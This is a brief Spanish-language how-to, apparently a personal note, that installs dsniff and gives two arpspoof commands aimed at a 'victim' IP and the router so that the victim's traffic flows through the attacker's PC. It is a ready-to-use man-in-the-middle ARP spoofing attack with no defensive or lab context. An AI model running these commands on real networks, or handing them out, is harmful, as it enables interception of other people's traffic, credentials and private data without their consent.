apt-get install dsniff

En centos está en el epel

Hacemos arpspoof para que todo el tráfico pase por mi pc
arpspoof -i eth0 -t ip.de.la.victima ip.del.router
arpspoof -i eth0 -t ip.del.router ip.de.la.victima

